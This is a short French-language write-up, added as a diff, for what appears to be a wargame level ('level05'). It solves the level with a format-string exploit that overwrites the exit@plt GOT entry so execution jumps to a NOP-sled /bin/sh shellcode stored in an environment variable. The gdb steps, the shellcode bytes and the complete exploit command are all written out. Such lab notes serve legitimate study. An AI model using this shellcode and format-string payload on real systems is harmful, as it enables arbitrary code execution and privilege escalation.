@@ -1,0 +1,38 @@
+basic fgets into prinf pas proteger, donc on sait que on va faire un FSA
+
+pas d'appel à system, donc soit on inclue un shellcode soit on peut utiliser la strat ret2libc i guess
+vu que j'ai deja fais du r2c plus tot je vais taper à coup de shellcode
+
+L'attaque consiste en rewrite l'adress de exit@plt pour exec le shell code plutot que la fonction
+
+env -i SHELLCODE=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"') gdb level05
+
+on met le shellcode dans les env
+
+x/200s environ
+
+on chope un des variable env qui commence par \220, on a le choix mais go prendre le premier 0xffffdc59 
+
+ensuite faut l'address de exit pour rewrite
+
+info function exit 
+
+0x08048370  exit@plt
+
+x/i 0x08048370
+
+jmp    *0x80497e0
+
+du coup la solution se contruit comme tel:
+
+(python -c 'print "
+    { exit address en deux fois du au padding de deux } +
+    { dc59 to decimal => 56409 - 8 <= les 8 bytes en amont  == 56401 } + 
+    { padding de 10 } + 
+    { ffff en decimal => 65535 - 56409 <= tout les caractere d'avant == 9126 } +
+    { padding de 11 }
+    "';cat)
+
+(python -c 'print "\xe0\x97\x04\x08\xe2\x97\x04\x08"+"%56401d"+"%10$n"+"%9126d"+"%11$n"';cat) | env -i SHELLCODE=$(python -c 'print "\x90"*1000+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')  ./level05
+
+et voila en fait
